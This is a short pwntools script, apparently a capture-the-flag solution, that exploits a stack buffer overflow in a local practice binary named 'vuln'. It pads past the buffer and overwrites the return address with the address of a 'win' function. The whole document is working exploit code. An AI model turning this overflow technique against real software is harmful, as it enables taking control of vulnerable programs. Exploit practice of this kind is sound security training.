from pwn import *

p = process("./vuln")
elf = ELF("./vuln")

p.sendlineafter("Please enter your string: \n", "a" * 0x28 + "b" * 4  + p32(elf.symbols["win"]))
p.interactive()